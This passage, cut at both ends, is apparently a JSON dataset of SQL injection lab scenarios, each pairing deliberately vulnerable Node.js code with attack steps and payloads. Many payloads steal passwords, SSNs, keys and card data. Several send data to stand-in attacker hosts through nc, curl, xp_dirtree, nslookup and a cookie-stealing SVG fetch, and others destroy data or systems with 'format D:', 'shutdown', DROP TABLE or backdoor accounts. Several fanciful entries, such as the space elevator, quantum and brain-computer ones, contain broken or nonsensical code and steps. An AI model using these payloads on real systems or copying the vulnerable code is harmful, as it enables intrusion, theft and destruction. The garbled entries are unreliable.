      "('1000'),('1e3'),('500'||(SELECT CASE WHEN 1=1 THEN pg_sleep(3) END))--",
      "('1337'::text);COPY prices TO PROGRAM 'nc a.com 53'--"
    ]
  },
  {
    "Lab scenario": "Military Drone Geofence SQLi",
    "Lab Description": "Bypass UAV no-fly zones through MGRS coordinate injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send spoofed MGRS payload",
      "2. Exploit spatial SQL functions",
      "3. Disable zone checks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const checkGF=(m)=>db.exec(`SELECT 1 FROM no_fly_zones WHERE MGRSIntersects('${m}',geometry) LIMIT 1`);",
    "payloads": [
      "18SUJ' OR 1=1;DROP TABLE zones--",
      "48Q' GLOB '*';INSERT INTO zones VALUES('',GeomFromText('POLYGON EMPTY'))--"
    ]
  },
  {
    "Lab scenario": "AI Voice Assistant Boolean SQLi",
    "Lab Description": "Exfiltrate voice profiles through phoneme pattern analysis",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft voice command",
      "2. Analyze response latency",
      "3. Use MFCC coefficient bypass"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procAudio=(b)=>{const t=speechToText(b);db.query(`SELECT response FROM commands WHERE text LIKE '${t}%'`,(e,r)=>{play(r[0].response);});};",
    "payloads": [
      "' UNION SELECT NULL,hash FROM voice_profiles--",
      "' OR 1=1 AND SOUNDEX(text)=SOUNDEX('exploit')--"
    ]
  },
  {
    "Lab scenario": "NFT Royalty ERC-721 SQLi",
    "Lab Description": "Skim royalties through metadata injection in tokenURI",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Deploy malicious NFT",
      "2. Exploit metadata parsing",
      "3. Redirect payments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "contract VulnNFT { function tokenURI(uint i) public view returns (string memory) { return string(abi.encodePacked(\"data:application/json,{\\\"name\\\":\\\"\", name, \"\\\",\\\"description\\\":\\\"\", db.query(string(abi.encodePacked(\\\"SELECT desc FROM nfts WHERE id=\\\", i))), \"\\\"}\")); } }",
    "payloads": [
      "'||(SELECT password FROM users)--",
      "');UPDATE payments SET recipient=0xATTACKER--"
    ]
  },
  {
    "Lab scenario": "Smart Grid MODBUS SQLi",
    "Lab Description": "Bypass PLC safety via register writes in power management",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Tamper MODBUS FC06 messages",
      "2. Exploit CAST overflow",
      "3. Manipulate neutron flux"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const writeReg=(a,v)=>db.run(`UPDATE modbus SET register_${a}=${v}`);",
    "payloads": [
      "255';UPDATE rods SET position=100--",
      "123.45);EXEC xp_cmdshell 'shutdown'--"
    ]
  },
  {
    "Lab scenario": "Metaverse Avatar SQLi",
    "Lab Description": "Steal crypto wallets via UV coordinate manipulation",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft malicious glTF model",
      "2. Exploit WebGL readback",
      "3. Use normal map steganography"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/render',(req,res)=>{db.query(`SELECT render_avatar(ARRAY[${req.body.materials}]::FLOAT[])`);});",
    "payloads": [
      "ARRAY[0,(SELECT wallet FROM users),0]",
      "ARRAY[NaN,NaN,NaN];DROP TABLE protections--"
    ]
  },
  {
    "Lab scenario": "COVID Variant Alignment SQLi",
    "Lab Description": "Exfiltrate patient zero data via FASTA header injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Inject BLAST queries",
      "2. Exploit gap penalty calc",
      "3. Reconstruct gene sequences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procGene=(f)=>{db.query(`INSERT INTO variants SELECT * FROM blast('${f}')`);};",
    "payloads": [
      ">seq_1' UNION SELECT gene_data FROM variants--",
      "'||(SELECT COUNT(*) FROM patients WHERE status='infected')--"
    ]
  },
  {
    "Lab scenario": "Autonomous Vehicle OBD-II SQLi",
    "Lab Description": "Exfiltrate location history via CAN bus injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Spoof RPM parameters",
      "2. Use bitwise response analysis",
      "3. Bypass CRC checks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procDiag=(o)=>{db.query(`SELECT * FROM telemetry WHERE rpm=${o.rpm} AND speed=${o.speed}`);};",
    "payloads": [
      "1500' AND ASCII(SUBSTR(vin,1,1))>90--",
      "2000' OR EXISTS(SELECT 1 FROM driver_homes)--"
    ]
  },
  {
    "Lab scenario": "Vertical Farming SQLi",
    "Lab Description": "Steal nutrient formulas via PH sensor injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Tamper MODBUS RTU",
      "2. Measure pump latency",
      "3. Reconstruct via timing channels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calibratePH=(v)=>{db.run(`UPDATE recipes SET last_ph=${v} WHERE tank_id=1`);};",
    "payloads": [
      "7.0';ATTACH DATABASE '/dev/rfcomm0' AS bt--",
      "5.5' AND LENGTH(formula)=256--"
    ]
  },
  {
    "Lab scenario": "Smart City Traffic SQLi",
    "Lab Description": "Exploit license plate OCR via ANPR camera bypass",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Create malicious plate frames",
      "2. Exploit OpenCV contours",
      "3. Use YOLO confidence scores"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procPlate=(i)=>{const t=ocr(i)||'Unknown';db.query(`SELECT * FROM vehicles WHERE plate='${t}'`);};",
    "payloads": [
      "'UNION SELECT sensor_data FROM traffic_cams--",
      "'||(SELECT COUNT(*) FROM speeding_tickets)--"
    ]
  },
  {
    "Lab scenario": "Drone Delivery Weight SQLi",
    "Lab Description": "Manipulate logistics via floating-point injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Tamper weight values",
      "2. Monitor gyro telemetry",
      "3. Use PID error patterns"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const logCargo=(w)=>{db.run(`INSERT INTO manifests(weight) VALUES(${w})`);};",
    "payloads": [
      "3.14159' OR hex(private_key) LIKE 'DEAD%'--",
      "9.80665');UPDATE drones SET home='0,0'--"
    ]
  },
  {
    "Lab scenario": "E-Learning JWT SQLi",
    "Lab Description": "Bypass enrollment checks via JWT claim injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Forge JWT with SQL payload",
      "2. Exploit 'none' algorithm",
      "3. Exfil via certificates"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const enroll=(jwt)=>{const sub=jwtDecode(jwt).sub;db.query(`SELECT * FROM courses WHERE student_id=${sub}`);};",
    "payloads": [
      "' UNION SELECT credit_card FROM payments--",
      "'||pgp_sym_decrypt(records,'key')--"
    ]
  },
  {
    "Lab scenario": "Food Delivery Geolocation SQLi",
    "Lab Description": "Exfiltrate driver credentials via GPS spoofing",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject Haversine formula",
      "2. Analyze routing times",
      "3. Use spherical errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calcRoute=(la,lo)=>{db.query(`SELECT driver_id FROM available WHERE 12742*ASIN(SQRT(POWER(SIN((RADIANS(${la})-RADIANS(lat))/2,2)+COS(RADIANS(lat))*COS(RADIANS(${la}))*POWER(SIN((RADIANS(${lo})-RADIANS(lon))/2,2))<5`);};",
    "payloads": [
      "51.5074' OR (SELECT 1 FROM users)--",
      "-0.1278);EXEC xp_cmdshell 'format D:'--"
    ]
  },
  {
    "Lab scenario": "Smart Mirror XSS/SQLi Hybrid",
    "Lab Description": "Chain voice command injection with DOM XSS",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Craft malicious voice query",
      "2. Exploit ICS file reflection",
      "3. Use SVG handlers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procVoice=(t)=>{db.query(`SELECT * FROM calendar WHERE event LIKE '%${t}%'`);};",
    "payloads": [
      "'||(SELECT password FROM users)--",
      "';INSERT INTO debug VALUES(1)--<svg onload=fetch('//attacker?='+document.cookie)>"
    ]
  },
  {
    "Lab scenario": "Space Elevator SQLi",
    "Lab Description": "Induce structural failure via nanotube tension injection",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge Young's modulus values",
      "2. Exploit ROLLBACK vulnerability",
      "3. Trigger resonance"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calcTension=(v)=>{db.query(`UPDATE specs SET modulus=${v} WHERE id=1`);};",
    "payloads": [
      "1e12' OR 1=1;UPDATE specs SET safety_factor=0.1--",
      "2.3e9);DELETE FROM maintenance_logs--"
    ]
  },
  {
    "Lab scenario": "Brain-Computer SQLi",
    "Lab Description": "Extract neural data via EEG pattern injection",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Encode SQL in alpha waves",
      "2. Measure cortex latency",
      "3. Use SSVEP tagging"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const procEEG=(s)=>{const p=fft(s).join(',');db.query(`SELECT command FROM gestures WHERE pattern~'${p}'`);};",
    "payloads": [
      "1e-5,2e-5,...';IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:5'--",
      "0.0;INSERT INTO motor_cmds VALUES('rm -rf /')--"
    ]
  },
  {
    "Lab scenario": "Quantum SQLi",
    "Lab Description": "Exfiltrate data via Grover's algorithm delays",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Manipulate qubit measurements",
      "2. Analyze decoherence times",
      "3. Use Shor's algorithm"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calibrate=()=>{db.query(`UPDATE qubits SET state=point(cos(${}),sin(${})) WHERE id=1`);};",
    "payloads": [
      "0) WHERE 1=1;CASE WHEN (SELECT secret) THEN qGAN(5) END--",
      "pi()/4' AND (SELECT COUNT(*) FROM experiments)=1--"
    ]
  },
  {
    "Lab scenario": "5G Core SQLi",
    "Lab Description": "Exfiltrate IMSI via invalid SUPI formatting",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft malicious SUPI",
      "2. Trigger Nudm queries",
      "3. Reassemble DNS exfil"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const validateSUPI=(s)=>{const c=s.replace(/[^0-9-]/g,'');return db.query(`SELECT 1 FROM subs WHERE supi LIKE '${c}%'`);};",
    "payloads": [
      "imsi-901'||(SELECT HEX(ki) FROM subs)--",
      "001-' UNION SELECT ki,NULL FROM subs--"
    ]
  },
  {
    "Lab scenario": "AI Art Generator SQLi",
    "Lab Description": "Poison diffusion models via prompt injection",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft malicious prompts",
      "2. Extract from metadata",
      "3. Use textual inversion"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const genArt=(p)=>{db.query(`INSERT INTO prompts VALUES('${p}')`);stableDiffusion.generate(p);};",
    "payloads": [
      "'cyberpunk cityscape'||(SELECT password FROM admins)--",
      "';UPDATE models SET weights=0xdeadbeef--"
    ]
  },
  {
    "Lab scenario": "E-Commerce UNION-Based SQLi in Product Sorting",
    "Lab Description": "Online store vulnerable through unvalidated 'sort' parameter in product listings",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept request with Burp Suite\n2. Test column count: ' ORDER BY 5--\n3. Inject UNION payload: ' UNION SELECT 1,@@version,3,4--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products',(req,res)=>{const sort=req.query.sort||'id';db.query(`SELECT * FROM products ORDER BY ${sort}`);});",
    "payloads": [
      "' UNION SELECT null,user(),null,null--",
      "' AND 1=2 UNION SELECT 1,2,3,4--"
    ]
  },
  {
    "Lab scenario": "Banking Boolean-Based Blind SQLi in Balance Check",
    "Lab Description": "Account balance check vulnerable to boolean inference attacks",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use sqlmap: sqlmap -u 'https://bank/api/balance' --technique=B\n2. Manual testing: ' AND SUBSTR((SELECT password),1,1)='a'\n3. Automate with Python requests"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/check-balance',(req,res)=>{const acc=req.body.account;db.query(`SELECT balance FROM accounts WHERE id='${acc}' AND active=1`);});",
    "payloads": [
      "' AND ASCII(SUBSTR((SELECT password),1,1))>97--",
      "' OR (SELECT COUNT(*) FROM users)=5--"
    ]
  },
  {
    "Lab scenario": "Healthcare Time-Based SQLi in Patient Lookup",
    "Lab Description": "Patient search vulnerable to time delays in PostgreSQL",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Confirm injection: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) END--\n2. Extract data via: '||(SELECT CASE WHEN SUBSTR(ssn,1,1)='A' THEN pg_sleep(3) END FROM patients)--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/patient',(req,res)=>{const name=req.query.name;db.query(`SELECT * FROM patients WHERE name='${name}'`);});",
    "payloads": [
      "'%3B SELECT pg_sleep(10)--",
      "'||(SELECT CASE WHEN LENGTH(ssn)=9 THEN pg_sleep(2) END)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Error-Based SQLi in Device Filtering",
    "Lab Description": "Device management portal leaks DB errors through invalid HAVING clauses",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Force error: ' HAVING 1=1--\n2. Extract version via: ' AND 1=CONVERT(int,@@version)--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices',(req,res)=>{const type=req.query.type;db.query(`SELECT * FROM iot_devices WHERE type='${type}' HAVING count>0`);});",
    "payloads": [
      "' HAVING 1=1--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
    ]
  },
  {
    "Lab scenario": "Social Media Out-of-Band SQLi in Profile Export",
    "Lab Description": "Profile export feature vulnerable to DNS exfiltration",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Use OWASP ZAP out-of-band scanner\n2. Inject payload: '; EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT password) + '.exfil'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export-profile',(req,res)=>{const uid=req.query.id;db.query(`SELECT * FROM users WHERE id=${uid}`);});",
    "payloads": [
      "'; EXEC xp_cmdshell('nslookup '+@@SERVERNAME+'.attacker.com')--",
      "' UNION SELECT null,(SELECT LOAD_FILE('/etc/passwd')),null--"
    ]
  },
  {
    "Lab scenario": "University Portal Second-Order SQLi in Course Registration",
    "Lab Description": "Course registration system processes malicious data from previous sessions",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Store payload in user profile: '||(SELECT CURRENT_USER())--\n2. Trigger during batch processing\n3. Verify via email confirmation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-profile',(req,res)=>{const bio=req.body.bio;db.query(`UPDATE users SET bio='${bio}' WHERE id=1`);});",
    "payloads": [
      "'||(SELECT password FROM admins)--",
      "'; INSERT INTO audit_log VALUES('hacked')--"
    ]
  },
  {
    "Lab scenario": "Government Website Stacked Queries in Document Search",
    "Lab Description": "Public document search allows stacked queries through unparameterized input",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate query with semicolon: '; DROP TABLE logs--\n2. Execute OS commands: '; EXEC xp_cmdshell 'del /F /Q C:\\logs\\*'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search',(req,res)=>{const q=req.query.q;db.query(`SELECT * FROM documents WHERE content LIKE '%${q}%'`);});",
    "payloads": [
      "'; DELETE FROM users--",
      "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--"
    ]
  },
  {
    "Lab scenario": "Ride-Sharing App JSON-Based SQLi in Location Tracking",
    "Lab Description": "Location tracking API vulnerable through JSON-encoded coordinates",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Modify POST body: {\"lat\":\"1' UNION SELECT 1,@@version--\",\"lng\":\"0\"}\n2. Bypass WAF with Unicode: \\u0027 UNION SELECT"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/location',(req,res)=>{const lat=req.body.lat,lng=req.body.lng;db.query(`INSERT INTO locations VALUES('${lat}','${lng}')`);});",
    "payloads": [
      "{\"lat\":\"1' OR 1=1--\",\"lng\":\"0\"}",
      "{\"lat\":\"\\u0027 UNION SELECT table_name,null FROM information_schema.tables--\"}"
    ]
  },
  {
    "Lab scenario": "Cryptocurrency Exchange Blind SQLi in Withdrawal API",
    "Lab Description": "Withdrawal validation vulnerable to boolean-based blind injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use time-based inference: ' AND IF(ASCII(SUBSTR((SELECT secret_key),1,1))>50,SLEEP(2),0)--\n2. Automate with Python script"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/withdraw',(req,res)=>{const addr=req.body.address;db.query(`SELECT * FROM wallets WHERE address='${addr}'`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT secret_key),1,1))>50,1,0)--",
      "' OR EXISTS(SELECT 1 FROM cold_storage WHERE amount>1000)--"
    ]
  },
  {
    "Lab scenario": "Smart Home UNION-Based SQLi in Device Naming",
    "Lab Description": "Device naming feature vulnerable to UNION injection through nickname field",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Find column count: ' ORDER BY 4--\n2. Inject payload: ' UNION SELECT 1,2,3,4--\n3. Extract credentials: ' UNION SELECT null,email,password,null FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/rename-device',(req,res)=>{const name=req.body.name;db.query(`UPDATE iot_devices SET nickname='${name}' WHERE id=1`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null,null--",
      "'||(SELECT GROUP_CONCAT(email,password) FROM users)--"
    ]
  },
  {
    "Lab scenario": "Travel Booking Error-Based SQLi in Flight Search",
    "Lab Description": "Flight search function leaks DB errors through invalid input",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Generate error: ' AND 1=CONVERT(int,@@version)--\n2. Extract data via error messages\n3. Use XML-based exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/flights',(req,res)=>{const from=req.query.from;db.query(`SELECT * FROM flights WHERE origin='${from}'`);});",
    "payloads": [
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
      "' FOR XML PATH('')--"
    ]
  },
  {
    "Lab scenario": "Food Delivery App Time-Based SQLi in Order Tracking",
    "Lab Description": "Order tracking system vulnerable to time delays in MySQL",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Confirm injection: ' AND SLEEP(5)--\n2. Binary search: ' AND ASCII(SUBSTR((SELECT password),1,1))>97 AND SLEEP(2)--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/track-order',(req,res)=>{const id=req.query.id;db.query(`SELECT * FROM orders WHERE order_id='${id}'`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT password),1,1))>97,SLEEP(2),0)--",
      "'||(SELECT SLEEP(3) FROM users WHERE admin=1)--"
    ]
  },
  {
    "Lab scenario": "Fitness Tracker Stacked Queries in Workout Logging",
    "Lab Description": "Workout logging feature allows multiple query execution",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate query: '; UPDATE users SET premium=1--\n2. Execute OS command: '; COPY users TO PROGRAM 'curl attacker.com?exfil='||password--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/log-workout',(req,res)=>{const exercise=req.body.exercise;db.query(`INSERT INTO workouts VALUES('${exercise}')`);});",
    "payloads": [
      "'; DROP TABLE payment_history--",
      "'; CREATE USER attacker WITH PASSWORD 'hacked'--"
    ]
  },
  {
    "Lab scenario": "Real Estate Platform Boolean-Based SQLi in Price Filter",
    "Lab Description": "Price range filter vulnerable to boolean response analysis",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect boolean responses: ' OR 1=1-- vs ' OR 1=2--\n2. Automate with sqlmap: --technique=B\n3. Extract DB structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/properties',(req,res)=>{const price=req.query.price;db.query(`SELECT * FROM properties WHERE price < ${price}`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM users)=5--",
      "' AND EXISTS(SELECT 1 FROM transactions WHERE amount>1000000)--"
    ]
  },
  {
    "Lab scenario": "Video Streaming Service UNION-Based SQLi in Search",
    "Lab Description": "Video search vulnerable through unvalidated search parameter",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Determine columns: ' ORDER BY 7--\n2. Inject: ' UNION SELECT 1,2,3,4,5,6,7--\n3. Extract credentials: ' UNION SELECT null,null,email,password,null,null,null FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search',(req,res)=>{const q=req.query.q;db.query(`SELECT * FROM videos WHERE title LIKE '%${q}%'`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null,null,null,null,null--",
      "'||(SELECT LOAD_FILE('/etc/passwd'))--"
    ]
  },
  {
    "Lab scenario": "Education Portal Error-Based SQLi in Course Enrollment",
    "Lab Description": "Course enrollment system leaks DB errors through invalid input",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Force error: ' AND 1=CONVERT(int,@@version)--\n2. Extract data via verbose errors\n3. Use XML PATH for concatenation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/enroll',(req,res)=>{const cid=req.body.course_id;db.query(`INSERT INTO enrollments VALUES('${cid}')`);});",
    "payloads": [
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--",
      "' FOR XML PATH('')--"
    ]
  },
  {
    "Lab scenario": "Gaming Platform Time-Based SQLi in Leaderboards",
    "Lab Description": "Leaderboard ranking system vulnerable to time delays",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Detect injection: ' AND IF(1=1,SLEEP(2),0)--\n2. Binary search exfiltration\n3. Use bitwise operations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/leaderboard',(req,res)=>{const sort=req.query.sort;db.query(`SELECT * FROM scores ORDER BY ${sort} DESC`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT password),1,1))&1=1,SLEEP(2),0)--",
      "'||(SELECT CASE WHEN COUNT(*)>0 THEN BENCHMARK(1000000,MD5(1)) END)--"
    ]
  },
  {
    "Lab scenario": "Job Portal Out-of-Band SQLi in Resume Upload",
    "Lab Description": "Resume parsing feature triggers external DNS lookups",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject in filename: '; EXEC xp_dirtree '\\\\attacker.com\\' + (SELECT password) + '.exfil'--\n2. Monitor DNS logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload-resume',(req,res)=>{const name=req.body.filename;db.query(`INSERT INTO resumes VALUES('${name}')`);});",
    "payloads": [
      "'; EXEC master..xp_fileexist '\\\\attacker.com\\' + @@version--",
      "' UNION SELECT null,(SELECT LOAD_FILE('/etc/passwd')),null--"
    ]
  },
  {
    "Lab scenario": "Music Streaming Service Stacked Queries in Playlist Creation",
    "Lab Description": "Playlist management allows stacked queries through unparameterized input",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate query: '; DROP TABLE premium_users--\n2. Create backdoor: '; INSERT INTO users VALUES('attacker','pass')--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/create-playlist',(req,res)=>{const name=req.body.name;db.query(`INSERT INTO playlists VALUES('${name}')`);});",
    "payloads": [
      "'; UPDATE settings SET ads=0--",
      "'; EXEC sp_addrolemember 'db_owner','attacker'--"
    ]
  },
  {
    "Lab scenario": "Sports Betting Platform Boolean-Based SQLi in Odds Calculation",
    "Lab Description": "Odds calculation API vulnerable to boolean inference",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect boolean responses via HTTP status codes\n2. Exfiltrate bit-by-bit: ' AND (SELECT ASCII(SUBSTR(credit_card,1,1))>50--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/odds',(req,res)=>{const team=req.query.team;db.query(`SELECT * FROM odds WHERE team='${team}'`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM transactions)>1000--",
      "' AND (SELECT LENGTH(credit_card)=16 FROM users)--"
    ]
  },
  {
    "Lab scenario": "Weather App UNION-Based SQLi in Location Search",
    "Lab Description": "Location search vulnerable through unvalidated city parameter",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Determine columns: ' ORDER BY 3--\n2. Inject: ' UNION SELECT 1,2,3--\n3. Extract secrets: ' UNION SELECT null,api_key,null FROM config--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/weather',(req,res)=>{const city=req.query.city;db.query(`SELECT * FROM locations WHERE city='${city}'`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null--",
      "'||(SELECT CRYPT_GEN_RANDOM(256))--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal UNION SQLi in Patient Search",
    "Lab Description": "Patient lookup vulnerable through unvalidated search parameter with direct UNION exploitation",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept search request with Burp Suite",
      "2. Determine column count: ' ORDER BY 7--",
      "3. Identify string columns: ' UNION SELECT 'a','b','c','d','e','f','g'--",
      "4. Extract credentials: ' UNION SELECT null,username,password,null,null,null,null FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/patients',(req,res)=>{const q=req.query.q;db.query(`SELECT * FROM patients WHERE name LIKE '%${q}%'`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null,null,null,null,null--",
      "' AND 1=0 UNION SELECT 1,2,3,4,5,6,7--"
    ]
  },
  {
    "Lab scenario": "IoT Device Time-Based SQLi in Sensor Readings",
    "Lab Description": "Sensor data API vulnerable to blind injection through unparameterized timestamps",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter with OWASP ZAP",
      "2. Confirm delay: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) END--",
      "3. Binary search exfiltration: '||(SELECT CASE WHEN ASCII(SUBSTR(secret,1,1))>97 THEN pg_sleep(2) END FROM config)--",
      "4. Automate with sqlmap: --technique=T --time-sec=5"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensors',(req,res)=>{const ts=req.query.timestamp;db.query(`SELECT value FROM sensors WHERE timestamp > ${ts}`);});",
    "payloads": [
      "'%3B SELECT pg_sleep(10)--",
      "'||(SELECT CASE WHEN LENGTH(secret)=32 THEN pg_sleep(3) END)--"
    ]
  },
  {
    "Lab scenario": "Banking App Error-Based SQLi in Transfer Validation",
    "Lab Description": "Fund transfer feature leaks database errors through malformed account numbers",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Force conversion error: ' AND 1=CONVERT(int,@@version)--",
      "2. Extract table names from error messages",
      "3. Use XML PATH for data concatenation: ' FOR XML PATH('')--",
      "4. Exfiltrate via verbose errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/transfer',(req,res)=>{const acc=req.body.account;db.query(`SELECT * FROM accounts WHERE number='${acc}'`);});",
    "payloads": [
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
      "' FOR XML PATH(''),ROOT('root')--"
    ]
  },
  {
    "Lab scenario": "E-Learning Platform Boolean SQLi in Course Enrollment",
    "Lab Description": "Course registration vulnerable to boolean response analysis through enrollment status checks",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect differential responses: ' OR 1=1-- vs ' OR 1=2--",
      "2. Automate with Python script sending 200 parallel requests",
      "3. Use bit-shifting for efficient exfiltration",
      "4. Reconstruct credentials through response boolean patterns"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/check-enrollment',(req,res)=>{const cid=req.query.course_id;db.query(`SELECT status FROM enrollments WHERE course_id=${cid}`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM admins)=1--",
      "' AND ASCII(SUBSTR((SELECT password),1,1))>96--"
    ]
  },
  {
    "Lab scenario": "Government Portal Out-of-Band SQLi in Document Export",
    "Lab Description": "PDF export feature triggers DNS lookups through malicious document properties",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Inject payload in author field: '; EXEC xp_dirtree '\\\\attacker.com\\' + (SELECT TOP 1 secret) + '.exfil'--",
      "2. Monitor DNS query logs",
      "3. Use base32 encoding for special characters",
      "4. Chain multiple requests for full data extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export',(req,res)=>{const meta=req.body.metadata;db.query(`INSERT INTO exports VALUES('${meta}')`);});",
    "payloads": [
      "'; EXEC xp_cmdshell('nslookup ' + @@version + '.attacker.com')--",
      "' UNION SELECT null,(SELECT secret FROM config),null--"
    ]
  },
  {
    "Lab scenario": "Social Media Second-Order SQLi in Profile Comments",
    "Lab Description": "Profile comment system processes stored malicious payloads during batch jobs",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Store payload: '||(SELECT CURRENT_USER())--",
      "2. Wait for nightly analytics processing",
      "3. Capture results in system reports",
      "4. Clean traces through follow-up injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment',(req,res)=>{const txt=req.body.text;db.query(`INSERT INTO comments VALUES('${txt}')`);});",
    "payloads": [
      "'||(SELECT password FROM users LIMIT 1)--",
      "'; UPDATE users SET admin=1 WHERE username='attacker'--"
    ]
  },
  {
    "Lab scenario": "Retail POS Stacked SQLi in Inventory Check",
    "Lab Description": "Inventory lookup allows multiple query execution through barcode parameter",
    "Difficulty Level": "Expert",
    "Solution Steps": [
